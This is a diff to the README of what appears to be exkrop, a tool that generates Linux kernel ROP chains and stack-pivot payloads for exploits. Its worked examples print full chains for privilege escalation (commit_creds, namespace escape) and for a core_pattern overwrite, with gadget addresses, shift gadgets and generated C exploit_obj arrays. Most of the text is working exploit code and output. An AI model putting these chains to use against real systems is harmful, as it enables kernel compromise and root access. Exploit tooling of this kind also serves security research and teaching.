@@ -15,7 +15,9 @@ PYTHONPATH=. python3 -m exkrop <vmlinux>
   - **core_pattern Overwrite**: `_copy_from_user(core_pattern, user_buf, len)` + `msleep`
 - **KASLR-relative output** — all kernel addresses emitted as `KERN(offset)` with a `KERN_BASE` macro
 - **Pivot gadget browser** — paginated selection of stack pivot gadgets (direct, offset, JOP chained, indirect) with detail view
-- **Reserved offset handling** — specify object offsets that must be preserved (e.g., vtable pointers); shift gadgets (`add rsp, N; ret`) are automatically inserted to skip over them
+- **Reserved offset handling** — specify object offsets that must be preserved (e.g., vtable pointers) using individual values or ranges (`0x0-0x10,0x60`); shift gadgets are automatically inserted to skip over them
+- **Side-effect detection** — pivot gadgets with memory writes to the controlled object (e.g., `or byte ptr [rbx + 0x41], bl`) are detected; corrupted offsets are automatically treated as occupied and skipped
+- **Pivot filtering** — pivots whose chain start conflicts with reserved offsets are filtered out before selection
 - **JOP dispatch awareness** — JOP pivot dispatch entries are treated as occupied slots and automatically skipped
 - **C code generation** — for inline pivots, a single `exploit_obj[]` array; for indirect pivots, separate `exploit_obj[]` (dispatch + pointer) and `rop_chain[]` (at known address) arrays, all with `#define`s and per-line annotations
 
@@ -32,53 +34,42 @@ PYTHONPATH=. python3 -m exkrop <vmlinux>
 
 ## Example Output
 
-### Privilege Escalation with JOP Pivot (chain at +0x0, dispatch at +0x8)
+### core_pattern Overwrite with Reserved Offsets and Side-Effect Detection
+
+This example shows reserved offset ranges, pivot filtering, and automatic side-effect write detection. The pivot gadget `or byte ptr [rbx + 0x41], bl` would corrupt offset `0x40` — exkrop detects this and inserts shift gadgets to skip over it along with user-reserved offsets.
 
 ```
-$ PYTHONPATH=. python3 -m exkrop /path/to/vmlinux
+$ exkrop /path/to/vmlinux
 Loading /path/to/vmlinux...
 Loading cache from ./_path_to_vmlinux_kernel_d15.exrop_cache
-Include non-clean gadgets (side effects)? [y/N]:
+Include non-clean gadgets (side effects)? [y/N]: y
 Gadgets loaded.
 
 === ROP Chain Templates ===
   [1] Privilege Escalation — commit_creds(init_cred) + namespace escape + fork + msleep
   [2] core_pattern Overwrite — _copy_from_user(core_pattern, user_buf, len) + msleep
 
-Select template [1-2]: 1
+Select template [1-2]: 2
 
 Resolving kernel base...
   Kernel base: 0xffffffff81000000
 Resolving symbols...
-  __x64_sys_fork                 0xffffffff811a6440 (base + 0x1a6440)
-  commit_creds                   0xffffffff811e37d0 (base + 0x1e37d0)
-  find_task_by_vpid              0xffffffff811d6c00 (base + 0x1d6c00)
-  init_cred                      0xffffffff840953a0 (base + 0x30953a0)
-  init_nsproxy                   0xffffffff84094e80 (base + 0x3094e80)
+  _copy_from_user                0xffffffff81b70980 (base + 0xb70980)
+  core_pattern                   0xffffffff842107e0 (base + 0x32107e0)
   msleep                         0xffffffff812732f0 (base + 0x2732f0)
-  switch_task_namespaces         0xffffffff811e16d0 (base + 0x1e16d0)
 
 === Building ROP chain ===
 
-[*] commit_creds(init_cred)
+Core pattern string [|/proc/%P/fd/666 %P]:
+User-space buffer address (hex) [0x4141414141414141]:
+[*] _copy_from_user(core_pattern, 0x4141414141414141, 20)
 $RSP+0x0000 : 0xffffffff81177704 # pop rdi ; ret
-$RSP+0x0008 : 0xffffffff840953a0
-$RSP+0x0010 : 0xffffffff811e37d0
-
-[*] find_task_by_vpid(1)
-$RSP+0x0000 : 0xffffffff815cd6ad # mov edi, 1 ; mov eax, edi ; ret
-$RSP+0x0008 : 0xffffffff811d6c00
-
-[*] switch_task_namespaces(rax, init_nsproxy)
-$RSP+0x0000 : 0xffffffff8243485a # push rax ; add eax, ebp ; pop rdi ; ret
-$RSP+0x0008 : 0xffffffff8115fbce # pop rsi ; ret
-$RSP+0x0010 : 0xffffffff84094e80
-$RSP+0x0018 : 0xffffffff811e16d0
-
-[*] fork(0)
-$RSP+0x0000 : 0xffffffff81177704 # pop rdi ; ret
-$RSP+0x0008 : 0x0000000000000000
-$RSP+0x0010 : 0xffffffff811a6440
+$RSP+0x0008 : 0xffffffff842107e0
+$RSP+0x0010 : 0xffffffff810260b6 # pop rdx ; ret
+$RSP+0x0018 : 0x0000000000000014
+$RSP+0x0020 : 0xffffffff8115fbce # pop rsi ; ret
+$RSP+0x0028 : 0x4141414141414141
+$RSP+0x0030 : 0xffffffff81b70980
 
 [*] msleep(1000000000)
 $RSP+0x0000 : 0xffffffff81177704 # pop rdi ; ret
@@ -89,24 +80,37 @@ $RSP+0x0010 : 0xffffffff812732f0
   [ 1] rdi
   ...
 
-Select pivot source register [1-13]: 1
-Reserved object offsets (hex, comma-separated, e.g. 0x10,0x18) [none]:
+Select pivot source register [1-13]: 5
+Reserved object offsets (hex, comma-separated, e.g. 0x10,0x18 or 0x0-0x10) [none]: 0x0-0x10,0x60
+  Reserved offsets: 0x0, 0x8, 0x10, 0x60
 
-Searching for pivots from rdi...
-Found 5 pivot(s).
+Searching for pivots from rbx...
+Filtered 28 pivot(s) conflicting with reserved offsets.
+Include indirect pivots (require known object address)? [y/N]: y
+Found 7 pivot(s).
 
---- Pivot candidates (1-5 of 5) ---
-  [ 1] jop            @ 0xffffffff81e3f0d6 # mov rbx, rdi ; mov rax, qword ptr [rdi + 8] ; call rax (chain at +0x0)
-  [ 2] jop            @ 0xffffffff81e3f0d6 # mov rbx, rdi ; mov rax, qword ptr [rdi + 8] ; call rax (chain at +0x10)
+--- Pivot candidates (1-7 of 7) ---
+  [ 1] offset         @ 0xffffffff81704143 # push rbx ; or byte ptr [rbx + 0x41], bl ; pop rsp ; ... (chain at +0x18)
+  [ 2] offset         @ 0xffffffff8123a45b # push rbx ; add dword ptr [rcx + 0x415d5be8], ecx ; pop rsp ; ... (chain at +0x18)
   ...
   [d N] Details  [q] Quit
 
 Select pivot: 1
 
-Occupied offsets within chain region: 0x8
-  0x8: JOP dispatch -> 0xffffffff81ccac6f
+Selected pivot:
+Pivot type: offset
+  Gadget: 0xffffffff81704143 # push rbx ; or byte ptr [rbx + 0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret
+  Source register: rbx
+  Offset: 0x18
+  ROP chain starts at [rbx+0x18]
+Pivot side-effect writes: 0x40
+
+Occupied offsets within chain region: 0x40, 0x60
+  0x40: side-effect write
+  0x60: reserved by user
 Inserting shift gadgets to skip occupied slots...
-  0x0: lea rsp, [rsp + 8] ; ret (skip 0x8 bytes)
+  0x38: lea rsp, [rsp + 8] ; ret (skip 0x8 bytes)
+  0x58: lea rsp, [rsp + 8] ; ret (skip 0x8 bytes)
 
 === Generated C code ===
 
@@ -115,43 +119,44 @@ Inserting shift gadgets to skip occupied slots...
 #define KERN_BASE 0xffffffff81000000ULL
 #define KERN(off) (KERN_BASE + (off))
 
-// Privilege escalation: get root + escape namespaces
+// core_pattern overwrite: crash a child to trigger payload
+
+// NOTE: place 20 bytes at user address 0x4141414141414141:
+// char pattern[] = "|/proc/%P/fd/666 %P";
 
 /*
- * Pivot type: jop
- * Source register: rdi
- * Step 1: KERN(0xe3f0d6) @ mov rbx, rdi ; mov rax, qword ptr [rdi + 8] ; call rax
- * Pivot: KERN(0xccac6f) @ push rbx ; pop rsp ; add ecx, dword ptr [rax - 0x39] ; ret
- * Dispatch: place KERN(0xccac6f) at [rdi+0x8]
- * ROP chain starts at [rdi+0x0]
+ * Pivot type: offset
+ * Source register: rbx
+ * Gadget: KERN(0x704143) @ push rbx ; or byte ptr [rbx + 0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret
+ * Offset: 0x18
+ * ROP chain starts at [rbx+0x18]
  */
-#define PIVOT_GADGET KERN(0xe3f0d6)
+#define PIVOT_GADGET KERN(0x704143)
 #define OBJ_SIZE     0x100
-#define CHAIN_OFFSET 0x0
-#define DISPATCH_0_OFFSET 0x8
+#define CHAIN_OFFSET 0x18
 
 uint64_t exploit_obj[] = {
-    KERN(0x177b940)       , // +0x00 | ROP chain start | shift: lea rsp, [rsp + 8] ; ret (skip 0x8)
-    KERN(0xccac6f)        , // +0x08 | dispatch[0] -> KERN(0xccac6f)
-    KERN(0x177704)        , // +0x10 | pop rdi ; ret
-    KERN(0x30953a0)       , // +0x18 | init_cred
-    KERN(0x1e37d0)        , // +0x20 | commit_creds
-    KERN(0x5cd6ad)        , // +0x28 | mov edi, 1 ; mov eax, edi ; ret
-    KERN(0x1d6c00)        , // +0x30 | find_task_by_vpid
-    KERN(0x143485a)       , // +0x38 | push rax ; add eax, ebp ; pop rdi ; ret
-    KERN(0x15fbce)        , // +0x40 | pop rsi ; ret
-    KERN(0x3094e80)       , // +0x48 | init_nsproxy
-    KERN(0x1e16d0)        , // +0x50 | switch_task_namespaces
-    KERN(0x177704)        , // +0x58 | pop rdi ; ret
-    0x0000000000000000ULL , // +0x60
-    KERN(0x1a6440)        , // +0x68 | __x64_sys_fork
+    0x0000000000000000ULL , // +0x00 | RESERVED
+    0x0000000000000000ULL , // +0x08 | RESERVED
+    0x0000000000000000ULL , // +0x10 | RESERVED
+    KERN(0x177704)        , // +0x18 | ROP chain start | pop rdi ; ret
+    KERN(0x32107e0)       , // +0x20 | core_pattern
+    KERN(0x260b6)         , // +0x28 | pop rdx ; ret
+    0x0000000000000014ULL , // +0x30
+    KERN(0x177b940)       , // +0x38 | shift: lea rsp, [rsp + 8] ; ret (skip 0x8)
+    0x0000000000000000ULL , // +0x40 | RESERVED
+    KERN(0x15fbce)        , // +0x48 | pop rsi ; ret
+    0x4141414141414141ULL , // +0x50
+    KERN(0x177b940)       , // +0x58 | shift: lea rsp, [rsp + 8] ; ret (skip 0x8)
+    0x0000000000000000ULL , // +0x60 | RESERVED
+    KERN(0xb70980)        , // +0x68 | _copy_from_user
     KERN(0x177704)        , // +0x70 | pop rdi ; ret
     0x000000003b9aca00ULL , // +0x78
     KERN(0x2732f0)        , // +0x80 | msleep
 };
 ```
 
-The shift gadget at `+0x00` (`lea rsp, [rsp + 8] ; ret`) skips over the JOP dispatch pointer at `+0x08`, then the full ROP chain executes from `+0x10` onward.
+Shift gadgets at `+0x38` and `+0x58` skip over the side-effect write at `+0x40` and the user-reserved offset at `+0x60`, keeping the ROP chain intact.
 
 ### Indirect JOP Pivot (chain at separate known address)
 
